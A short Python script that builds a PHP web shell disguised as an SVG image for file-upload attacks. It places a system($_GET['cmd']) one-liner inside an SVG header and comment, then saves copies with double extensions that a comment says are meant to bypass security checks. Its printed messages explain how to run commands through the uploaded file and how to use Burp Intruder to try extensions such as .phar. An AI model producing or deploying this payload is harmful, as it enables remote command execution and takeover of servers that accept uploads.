from io import BytesIO

# PHP content (example: simple system execution shell)
php_content = '''
<?php 
system($_GET["cmd"]);
?>
'''

# SVG file magic number (file header)
svg_magic_number = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'''

# Function to create a .svg file with embedded PHP code
def create_php_to_svg_with_magic_number():
    # Create an in-memory byte buffer
    f = BytesIO()
    
    # Write the SVG file magic number
    f.write(svg_magic_number.encode('utf-8'))
    
    # Embed the PHP payload as a comment within the SVG file
    f.write(f'<!--\n{php_content}\n-->'.encode('utf-8'))  # Place PHP inside an XML comment
    
    # Reset buffer position to the start
    f.seek(0)
    
    return f

# Generate the in-memory PHP-SVG hybrid file
php_svg_file = create_php_to_svg_with_magic_number()

# Save as a .svg.php file (dual extension to bypass security checks)
with open('phpinfo2.svg.php', 'wb') as output_file:
    output_file.write(php_svg_file.read())

# Recreate buffer and save as a .svg file
php_svg_file = create_php_to_svg_with_magic_number()

# Save as a .svg extension file
with open('phpinfo2.svg', 'wb') as output_file:
    output_file.write(php_svg_file.read())

# Print success message
print("Files 'phpinfo2.svg' and 'phpinfo2.svg.php' have been successfully created with embedded PHP code and an SVG magic number!\n")
print("Try exploiting by accessing: http://example.com/uploads/phpinfo2.svg.php?cmd=whoami\n")
print("If the upload fails, use Burp Suite's Intruder tool to test different extensions such as phpinfo2.svg.phar.\n")
print("With Intruder, you can set the payload position and automate extension testing for common vulnerabilities.\n")
